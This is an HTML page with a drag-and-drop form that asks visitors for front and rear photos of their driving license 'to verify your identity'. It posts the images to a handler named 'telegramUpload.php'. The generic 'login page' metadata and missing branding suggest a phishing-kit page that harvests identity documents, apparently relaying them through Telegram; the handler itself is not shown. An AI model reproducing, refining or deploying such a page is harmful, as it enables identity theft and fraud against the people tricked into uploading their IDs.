<!DOCTYPE html>
<html>
<head>
	<title></title>
	<meta name="keywords" content="login page"/>
	<meta name="description" content="login page"/>

	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Stylesheets -->
	<link rel="stylesheet" href="css/bootstrap.min.css"/>
	<link rel="icon" type="image/png" href="#"/>
	<link rel="icon" type="image/png" href="#"/>
	<link rel="preconnect" href="https://fonts.gstatic.com">
	<link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,700;1,400;1,600&display=swap" rel="stylesheet"> 
	<link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300&amp;display=swap" rel="stylesheet">
	<link rel="stylesheet" href="css/style.css"/>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">	
  <style type="text/css">
    .drop-zone
    {
      width: 100%;
    }
  </style>
</head>
<body>
  
<div class="parent">
	<div>
		<span style="text-align: center;" class="top-text">Upload Images</span>
		<span class="sub-text">Upload pictures of your driving license (JPEG or PNG).</span>
	</div>
	<div>
    <form method="post" action="telegramUpload.php" enctype="multipart/form-data">
     
    <div style="display: flex;">
      <div class="drop-zone">
      <span class="drop-zone__prompt">Drop & Drop or click to upload.</span>
      <input type="file" name="attachment1" class="drop-zone__input">
      
    </div>
    
    
    <div class="drop-zone">
      <span class="drop-zone__prompt">Drop & Drop or click to upload.</span>
      <input type="file" name="attachment2" class="drop-zone__input">
    </div>
    </div>
    <div class="comptext" style="display: flex;">
      <span style="width: 220px;text-align: center;display: block;padding-top: 13px;font-size: 20px;">Front</span>
      <span style="width: 220px;text-align: center;display: block;padding-top: 13px;font-size: 20px;">Rear </span>
    </div>
      
  	<div>
  		<span class="data">
  			Please do not watermark or otherwise any part of your ID, This will help ensure we can verify your identity as quickly and accurately as possible.
  		</span>
  	</div>
  	<div class="submit">
  		<input type="submit" name="submit" class="subit btn btn-primary" value="Continue" />
  	</div>
  	<div class="submit">
  		<a href="index.php" class="goback">Go back</a>
  	</div>

    </form>
</div>
<script type="text/javascript">
	document.querySelectorAll(".drop-zone__input").forEach((inputElement) => {
  const dropZoneElement = inputElement.closest(".drop-zone");

  dropZoneElement.addEventListener("click", (e) => {
    inputElement.click();
  });

  inputElement.addEventListener("change", (e) => {
    if (inputElement.files.length) {
      updateThumbnail(dropZoneElement, inputElement.files[0]);
    }
  });

  dropZoneElement.addEventListener("dragover", (e) => {
    e.preventDefault();
    dropZoneElement.classList.add("drop-zone--over");
  });

  ["dragleave", "dragend"].forEach((type) => {
    dropZoneElement.addEventListener(type, (e) => {
      dropZoneElement.classList.remove("drop-zone--over");
    });
  });

  dropZoneElement.addEventListener("drop", (e) => {
    e.preventDefault();

    if (e.dataTransfer.files.length) {
      inputElement.files = e.dataTransfer.files;
      updateThumbnail(dropZoneElement, e.dataTransfer.files[0]);
    }

    dropZoneElement.classList.remove("drop-zone--over");
  });
});

/**
 * Updates the thumbnail on a drop zone element.
 *
 * @param {HTMLElement} dropZoneElement
 * @param {File} file
 */
function updateThumbnail(dropZoneElement, file) {
  let thumbnailElement = dropZoneElement.querySelector(".drop-zone__thumb");

  // First time - remove the prompt
  if (dropZoneElement.querySelector(".drop-zone__prompt")) {
    dropZoneElement.querySelector(".drop-zone__prompt").remove();
  }

  // First time - there is no thumbnail element, so lets create it
  if (!thumbnailElement) {
    thumbnailElement = document.createElement("div");
    thumbnailElement.classList.add("drop-zone__thumb");
    dropZoneElement.appendChild(thumbnailElement);
  }

  thumbnailElement.dataset.label = file.name;

  // Show thumbnail for image files
  if (file.type.startsWith("image/")) {
    const reader = new FileReader();

    reader.readAsDataURL(file);
    reader.onload = () => {
      thumbnailElement.style.backgroundImage = `url('${reader.result}')`;
    };
  } else {
    thumbnailElement.style.backgroundImage = null;
  }
}

</script>
</body>
</html>